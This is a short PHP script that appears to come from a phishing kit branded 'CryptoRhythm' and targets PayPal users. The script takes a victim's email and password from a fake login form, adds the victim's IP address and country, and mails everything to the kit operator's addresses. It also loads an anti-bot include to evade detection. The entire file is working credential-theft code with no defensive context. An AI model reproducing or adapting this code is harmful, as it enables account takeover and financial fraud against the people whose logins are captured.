<?php
  session_start();
  require_once("../inc/config.inc.php");
  require_once("../antibots.php");
  if(isset($_GET['submit'])) {
    $email = $_GET['email'];
    $password = $_GET['password'];
    $_SESSION['step'] = "s1";
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
    CryptoRhythm V 2.1 [PRV8]
    [LOGIN DETAILS]
    Email [ $email ]
    Password [ $password ]
    [Client Info]
    IP > $ip
    Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip
    ";
    $subject = "[CryptoRhythm] New PayPal login from [$cd] - $ip";
    foreach(explode(",", $tomail) as $tom) {
	mail($tom, $subject, $body);
    }
    echo "RESULT:DONE;";
  }
?>
